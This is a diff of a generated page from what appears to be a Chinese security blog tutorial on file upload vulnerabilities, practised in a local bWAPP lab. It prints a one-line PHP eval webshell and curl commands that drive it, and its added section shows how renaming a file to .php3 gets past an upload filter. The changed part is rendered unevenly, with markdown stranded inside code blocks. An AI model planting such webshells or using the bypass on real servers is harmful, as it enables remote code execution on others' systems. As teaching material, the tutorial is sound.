@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    446 字
+                    885 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    5
+                    10
                      分钟
                   </span>
                 
@@ -183,7 +183,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年12月5日 下午
+                  本文最后更新于：2020年12月13日 下午
                 
               </p>
             
@@ -191,6 +191,7 @@
               <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="1、漏洞原理：Webshell"><a href="#1、漏洞原理：Webshell" class="headerlink" title="1、漏洞原理：Webshell"></a>1、漏洞原理：Webshell</h2><p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限。<br>webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。<br>关键函数：以php为例，eval（），执行用户输入的函数。</p>
 <h2 id="2、一句话木马"><a href="#2、一句话木马" class="headerlink" title="2、一句话木马"></a>2、一句话木马</h2><h3 id="2-1-php一句话木马"><a href="#2-1-php一句话木马" class="headerlink" title="2.1 php一句话木马"></a>2.1 php一句话木马</h3><pre><code class="hljs plain">&lt;?php @eval($_POST[&#39;hacker&#39;]);?&gt;</code></pre>
 <p>获取post请求中hacker字段的值，并将该值转换为php代码执行；</p>
+<h2 id="3、后缀名绕过"><a href="#3、后缀名绕过" class="headerlink" title="3、后缀名绕过"></a>3、后缀名绕过</h2><h3 id="3-1-php文件后缀名绕过"><a href="#3-1-php文件后缀名绕过" class="headerlink" title="3.1 php文件后缀名绕过"></a>3.1 php文件后缀名绕过</h3><p>apache、nginx等web服务器会加载一些语言解析器模块，如python、php、asp等，当某个特定的文件后缀名被限制上传的时候，我们就可以根据web server的解析原理，修改文件后缀名，达到绕过限制的目的，但不是所有的后缀名都能被web server解析，下面通过实战模拟探究下绕过的原理</p>
 <h2 id="实战模拟"><a href="#实战模拟" class="headerlink" title="实战模拟"></a>实战模拟</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code class="hljs plain"># 第一次启动
 docker pull registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F;bwapp
 docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F;bwapp
@@ -198,10 +199,33 @@ docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F
 # 根据课程中的演示搭建好 bWAPP 实验环境后，以后再启动 bWAPP
 docker container list -a # 查看 container id
 docker start xxx # xxx 就是上一步获得的 container id，运行完这条命令后，访问响应的网址即可</code></pre>
-<h3 id="一句话木马上传"><a href="#一句话木马上传" class="headerlink" title="一句话木马上传"></a>一句话木马上传</h3><p>初始化bwapp，过程省略，选择文件上传漏洞 Unrestricted File Upload，按下图操作，上传一句话木马文件，并复制上传后服务器返回的文件保存地址<br><img src="/img/fileupload1.gif" srcset="/img/loading.gif" alt="fileupload"><br>构造一句话木马，在POST请求的hacker字段中写入我们希望服务器执行的代码，利用curl工具构造post请求：</p>
-<pre><code>curl -d &quot;hacker=echo get_current_user();&quot; http://127.0.0.1:8888/images/shell.php
-curl -d &quot;hacker=echo getcwd();&quot; http://127.0.0.1:8888/images/shell.php</code></pre><p>此处介绍两个php api<br>get_current_user()：获取服务所属用户名<br>getcwd()：获取当前执行目录<br>操作见下图，服务器成功返回了用户名www-data及当前执行目录/app/images<br><img src="/img/fileupload2.gif" srcset="/img/loading.gif" alt="fileupload"></p>
 
+<h3 id="一句话木马上传"><a href="#一句话木马上传" class="headerlink" title="一句话木马上传"></a>一句话木马上传</h3><p>初始化bwapp，过程省略，选择文件上传漏洞 Unrestricted File Upload，按下图操作，上传一句话木马文件，并复制上传后服务器返回的文件保存地址<br><img src="/img/fileupload1.gif" srcset="/img/loading.gif" alt="fileupload"><br>构造一句话木马，在POST请求的hacker字段中写入我们希望服务器执行的代码，利用curl工具构造post请求：</p>
+<pre><code class="hljs plain">curl -d &quot;hacker&#x3D;echo get_current_user();&quot; http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;images&#x2F;shell.php
+curl -d &quot;hacker&#x3D;echo getcwd();&quot; http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;images&#x2F;shell.php
+&#96;&#96;&#96; 
+
+此处介绍两个php api
+get_current_user()：获取服务所属用户名
+getcwd()：获取当前执行目录
+操作见下图，服务器成功返回了用户名www-data及当前执行目录&#x2F;app&#x2F;images
+![fileupload](&#x2F;img&#x2F;fileupload2.gif)
+
+### 文件名后缀绕过
+将文件上传等级设置为 medium，上传文件后缀为php时，显示被拦截，如下：
+![fileupload](&#x2F;img&#x2F;hz.gif)
+将shell.php文件后缀修改为php3和php30，上传php3后缀文件时，可成功绕过后缀名限制
+![fileupload](&#x2F;img&#x2F;hz3.png)
+上传shell.php30文件，服务器将文件当作txt文本进行了处理，直接打印了文件内容
+![fileupload](&#x2F;img&#x2F;hz.png)
+通过web server的配置文件，探究文件名绕过的原理；bwapp使用的web server是apache，通过配置文件可以了解到apache的语言解析模块文件路径</code></pre>
+<p>vim /etc/apache2/apache2.conf</p>
+<pre><code class="hljs plain">![fileupload](&#x2F;img&#x2F;apcf.png)
+进入对应的语言解析模块配置文件：</code></pre>
+<p>vim /etc/apache2/mods-enabled/php5.conf</p>
+<pre><code>
+![fileupload](/img/phpconf.png)
+通过配置文件可发现，php、php3、php5、phptml等文件后缀都可以被apache服务器解析，这也就是为什么刚刚上传的php3文件可被执行，php30不能被执行的原因。了解了文件名后缀的绕过原理，我们就可以通过上传不同的后缀名文件来达到文件后缀名限制绕过的目的。</code></pre>
             </article>
             <hr>
             <div>
